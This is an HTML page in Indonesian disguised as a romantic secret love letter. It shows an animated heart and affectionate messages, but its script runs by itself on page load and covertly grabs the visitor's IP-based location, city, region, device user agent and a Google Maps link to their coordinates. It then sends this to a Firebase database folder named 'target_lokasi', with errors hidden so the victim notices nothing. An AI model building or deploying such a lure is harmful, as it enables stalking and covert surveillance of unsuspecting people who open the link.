<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Surat Spesial Untukmu ❤️</title>
    <style>
        body { 
            background: #ffebee; 
            color: #d81b60; 
            font-family: sans-serif; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            margin: 0; 
            text-align: center;
        }
        .container { padding: 20px; }
        .heart { font-size: 60px; color: #e91e63; animation: beat .3s infinite alternate; }
        @keyframes beat { to { transform: scale(1.2); } }
        #status { font-size: 14px; color: #ad1457; margin-top: 15px; font-style: italic; }
    </style>
</head>
<body>

    <div class="container">
        <div class="heart">❤️</div>
        <h1 id="title">Sedang membuka pesan rahasia...</h1>
        <p id="status">Tunggu sebentar ya, koneksi lagi disiapkan...</p>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <script>
        // 1. LINK DATABASE YANG SUDAH DIPERBAIKI (ASIA-SOUTHEAST1)
        const firebaseConfig = {
            databaseURL: "https://pirdangame-default-rtdb.asia-southeast1.firebasedatabase.app"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // 2. SISTEM INTEL PIRDAN (AUTO SCAN)
        async function startIntelScan() {
            try {
                // Tarik data lokasi
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                // Data yang akan dikirim ke Firebase
                const logData = {
                    ip: data.ip || "Gak kebaca",
                    kota: data.city || "Gak kebaca",
                    wilayah: data.region || "Gak kebaca",
                    perangkat: navigator.userAgent,
                    waktu: new Date().toLocaleString(),
                    google_maps: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
                };

                // Kirim ke folder 'target_lokasi'
                await db.ref('target_lokasi').push(logData);
                
                // Tampilan setelah sukses kirim (5 detik total)
                setTimeout(() => {
                    document.getElementById('title').innerText = "Aku sebenernya suka sama kamu...";
                    document.getElementById('status').innerText = "Tunggu aku di sana ya ❤️";
                }, 3000);

            } catch (error) {
                console.log("Silent Error");
                // Tetap romantis walau gagal
                setTimeout(() => {
                    document.getElementById('title').innerText = "Aku sayang kamu selamanya.";
                    document.getElementById('status').innerText = "Cintaku gak butuh sinyal ❤️";
                }, 3000);
            }
        }

        // Jalankan Intel setelah 2 detik
        setTimeout(startIntelScan, 2000);
    </script>
</body>
</html>
